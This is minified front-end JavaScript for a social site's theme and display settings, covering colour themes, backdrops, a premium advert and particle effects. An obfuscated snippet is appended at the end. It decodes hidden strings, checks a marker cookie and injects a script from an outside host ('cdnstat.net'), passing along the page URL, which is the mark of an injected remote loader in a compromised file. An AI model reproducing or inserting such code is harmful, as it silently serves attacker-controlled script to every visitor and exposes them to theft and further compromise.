"--fontColor","#ffffff"),setCSSVar("--themeColor","#f13333"),particles="snow",document.body.classList.add("snowtop");break;case"Midnight Haze":setCSSVar("--leftSidebarColor","black"),setCSSVar("--pageColor","linear-gradient(135deg, #0c1762, #650f9b, #780f31)"),setCSSVar("--pageColor2","var(--pageColor)"),setCSSVar("--contentColor","#1F1F59"),setCSSVar("--contentColor2","#421f59"),setCSSVar("--contentColor3","#611f59"),setCSSVar("--fontColor","white"),setCSSVar("--themeColor","#78ddd4"),particles=null;break;case"Moss Green":setCSSVar("--leftSidebarColor","black"),setCSSVar("--pageColor","radial-gradient(ellipse at bottom, #658d65, #0d2c0a)"),setCSSVar("--pageColor2","var(--pageColor)"),setCSSVar("--contentColor","#334e33"),setCSSVar("--contentColor2","#395839"),setCSSVar("--contentColor3","#426042"),setCSSVar("--fontColor","white"),setCSSVar("--themeColor","#78dd8a"),particles=null;break;case"Ourple üòÇ":setCSSVar("--leftSidebarColor","black"),setCSSVar("--pageColor","#4638a1"),setCSSVar("--pageColor2","var(--pageColor)"),setCSSVar("--contentColor","#5a4cb1"),setCSSVar("--contentColor2","#6459ab"),setCSSVar("--contentColor3","#6c62af"),setCSSVar("--fontColor","white"),setCSSVar("--themeColor","#bab3e9"),particles=null;break;case"Peachy Mist":setCSSVar("--leftSidebarColor","black"),setCSSVar("--pageColor","linear-gradient(315deg, #f0b980, pink)"),setCSSVar("--pageColor2","var(--pageColor)"),setCSSVar("--contentColor","#f9e5e8"),setCSSVar("--contentColor2","#f9dad7"),setCSSVar("--contentColor3","#f3c2d4"),setCSSVar("--fontColor","#46261b"),setCSSVar("--themeColor","#ed3950"),particles=null;break;case"Faded":setCSSVar("--leftSidebarColor","black"),setCSSVar("--pageColor","linear-gradient(295deg, #336264, #3a4048)"),setCSSVar("--pageColor2","var(--pageColor)"),setCSSVar("--contentColor","#497287"),setCSSVar("--contentColor2","#5a8399"),setCSSVar("--contentColor3","#6a91a5"),setCSSVar("--fontColor","white"),setCSSVar("--themeColor","#a9cfe9"),particles=null;break;case"Into the Light":setCSSVar("--leftSidebarColor","black"),setCSSVar("--pageColor","radial-gradient(circle at 30% 70%, #fbe286, #4caed3)"),setCSSVar("--pageColor2","var(--pageColor)"),setCSSVar("--contentColor","#e9e8c2"),setCSSVar("--contentColor2","#e3ddca"),setCSSVar("--contentColor3","#d9d4c4"),setCSSVar("--fontColor","#152c46"),setCSSVar("--themeColor","#1199dd"),particles=null;break;case"Canyon":setCSSVar("--leftSidebarColor","black"),setCSSVar("--pageColor","radial-gradient(ellipse at bottom, #d5610f, #581703)"),setCSSVar("--pageColor2","var(--pageColor)"),setCSSVar("--contentColor","#783715"),setCSSVar("--contentColor2","#7c3d1c"),setCSSVar("--contentColor3","#85401b"),setCSSVar("--fontColor","white"),setCSSVar("--themeColor","#e5986a"),particles=null;break;case"Spocco":setCSSVar("--leftSidebarColor","black"),setCSSVar("--pageColor","linear-gradient(180deg, #ededed 20%, #bbb8b8 80%)"),setCSSVar("--pageColor2","var(--pageColor)"),setCSSVar("--contentColor","#f1f1f1"),setCSSVar("--contentColor2","#ebedef"),setCSSVar("--contentColor3","#dce3e9"),setCSSVar("--fontColor","#242c32"),setCSSVar("--themeColor","#0db7c1"),particles=null;break;case"Into the Night":setCSSVar("--leftSidebarColor","black"),setCSSVar("--pageColor","radial-gradient(circle at 50% 20%, #3e5a72, #000)"),setCSSVar("--pageColor2","var(--pageColor)"),setCSSVar("--contentColor","#0b1218"),setCSSVar("--contentColor2","#0d151c"),setCSSVar("--contentColor3","#141f28"),setCSSVar("--fontColor","white"),setCSSVar("--themeColor","#758691"),particles=null;break;default:setCSSVar("--leftSidebarColor","#262630"),setCSSVar("--pageColor","#151617"),setCSSVar("--pageColor2","var(--pageColor)"),setCSSVar("--contentColor","#1f1f28"),setCSSVar("--contentColor2","#24242e"),setCSSVar("--contentColor3","#2a2a37"),setCSSVar("--fontColor","#ffffff"),setCSSVar("--themeColor","#5AB7FA"),particles=null}}function updateBackdrop(e){null!=e&&hasPremium()?(findI("backdrop").style.backgroundImage=`url("https://photop-content.s3.amazonaws.com/Backdrops/${e}")`,findI("backdrop").style.opacity=.3):findI("backdrop").style.opacity=0}function premiumPerk(e){return`<div class="premiumPerkAd">\n  <div>\n    <img src="https://exotek.co/images/photop/premium.svg" class="premiumPerkIcon">\n  </div>\n  <div style="margin-left: 5px;">\n    <div class="premiumPerkTitle">Premium Perk</div>\n    <div class="premiumPerkDesc">${e}</div>\n    <button class="premiumAdAction" onclick="setPage('premium');findC('backBlur').remove();">Learn More</button>\n  </div>\n  </div>`}function createParticle(){if(null==particles||!viewingTab)return;let e=createElement("particle-"+particles,"div",findC("body"));e.style.left=100*Math.random()+"%",setTimeout((function(){e.remove()}),15e3)}setInterval(createParticle,isMobile?1500:500),null!=getLocalStore("display")&&(account.Settings={Display:JSON.parse(getLocalStore("display"))},updateDisplay(account.Settings.Display.Theme),updateBackdrop(account.Settings.Backdrop));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));